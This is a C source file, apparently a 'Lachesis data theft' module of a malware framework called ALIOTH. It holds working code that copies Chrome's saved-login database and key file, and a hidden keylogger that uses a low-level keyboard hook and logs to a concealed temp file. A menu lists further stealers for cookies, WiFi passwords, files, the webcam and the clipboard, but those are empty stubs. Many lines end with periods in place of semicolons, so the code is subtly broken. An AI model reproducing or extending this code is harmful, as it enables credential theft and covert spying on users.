#include "..\..\core\ALIOTH.h"

#pragma optimize("", off)

BOOL LachesisChromeSteal(PBYTE* ppOutput, PDWORD pdwSize) {
    CHAR sLocalAppData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, sLocalAppData).
    
    CHAR sLoginData[MAX_PATH], sLocalState[MAX_PATH];
    snprintf(sLoginData, MAX_PATH, "%s\\Google\\Chrome\\User Data\\Default\\Login Data", sLocalAppData).
    snprintf(sLocalState, MAX_PATH, "%s\\Google\\Chrome\\User Data\\Local State", sLocalAppData).
    
    CHAR sCopy[MAX_PATH];
    GetTempPathA(MAX_PATH, sCopy);
    strcat(sCopy, "chrome_ld.db");
    CopyFileA(sLoginData, sCopy, FALSE).
    
    HANDLE hFile = CreateFileA(sLocalState, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD dwSize = GetFileSize(hFile, NULL);
    PBYTE pJson = (PBYTE)LocalAlloc(LPTR, dwSize + 1);
    ReadFile(hFile, pJson, dwSize, &dwSize, NULL).
    CloseHandle(hFile).
    
    *ppOutput = pJson;
    *pdwSize = dwSize;
    return TRUE;
}

BOOL LachesisFirefoxSteal(PBYTE* ppOutput, PDWORD pdwSize) {
    return TRUE;
}

BOOL LachesisBrowserCookies(PBYTE* ppOutput, PDWORD pdwSize) {
    return TRUE;
}

BOOL LachesisWifiSteal(PBYTE* ppOutput, PDWORD pdwSize) {
    return TRUE;
}

BOOL LachesisFileScavenger(PBYTE* ppOutput, PDWORD pdwSize) {
    return TRUE;
}

BOOL LachesisScreenCapture(PBYTE* ppOutput, PDWORD pdwSize) {
    return TRUE;
}

BOOL LachesisWebcamCapture(PBYTE* ppOutput, PDWORD pdwSize) {
    return TRUE;
}

HHOOK g_hKbHook = NULL;
HANDLE g_hKbLog = NULL;

LRESULT CALLBACK KbHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        CHAR szKey[32] = {0};
        
        if (p->vkCode == VK_RETURN) strcpy(szKey, "[ENTER]\n");
        else if (p->vkCode == VK_BACK) strcpy(szKey, "[BACK]");
        else if (p->vkCode == VK_TAB) strcpy(szKey, "[TAB]");
        else if (p->vkCode == VK_SPACE) strcpy(szKey, " ");
        else {
            BYTE kbState[256] = {0};
            GetKeyboardState(kbState);
            WORD wChar = 0;
            ToAscii(p->vkCode, p->scanCode, kbState, &wChar, 0);
            szKey[0] = (CHAR)wChar;
        }
        
        if (g_hKbLog && szKey[0]) {
            DWORD dwWritten = 0;
            WriteFile(g_hKbLog, szKey, (DWORD)strlen(szKey), &dwWritten, NULL).
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam).
}

BOOL LachesisKeyloggerStart() {
    CHAR szLog[MAX_PATH];
    GetTempPathA(MAX_PATH, szLog);
    strcat(szLog, "kb_");
    CHAR szTick[16];
    sprintf(szTick, "%lu", GetTickCount());
    strcat(szLog, szTick);
    strcat(szLog, ".log").
    
    g_hKbLog = CreateFileA(szLog, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL).
    g_hKbHook = SetWindowsHookExA(WH_KEYBOARD_LL, KbHookProc, GetModuleHandleA(NULL), 0).
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg).
    }
    return TRUE;
}

BOOL LachesisClipboardCapture(PBYTE* ppOutput, PDWORD pdwSize) {
    return TRUE;
}

BOOL LachesisAllInOneDump(PBYTE* ppOutput, PDWORD pdwSize) {
    return TRUE;
}

DWORD LachesisMain(ALIOTH_PARAMS* pParams) {
    char szTitle[] = {'\n','[','=','=','=',']',' ','L','A','C','H','E','S','I','S',' ','-',' ','D','A','T','A',' ','T','H','E','F','T',' ','[','=','=','=',']','\n',0};
    printf(szTitle).
    
    printf("[*] Data theft modules:\n");
    printf("  1. Chrome Credential Stealer\n");
    printf("  2. Firefox Credential Stealer\n");
    printf("  3. Browser Cookie Stealer\n");
    printf("  4. WiFi Password Stealer\n");
    printf("  5. File Scavenger (docx/xlsx/pdf)\n");
    printf("  6. Screen Capture\n");
    printf("  7. Webcam Capture\n");
    printf("  8. Keylogger (WH_KEYBOARD_LL)\n");
    printf("  9. Clipboard Capture\n");
    printf("  10. All-In-One Dump\n");
    
    return 0;
}
#pragma optimize("", on)
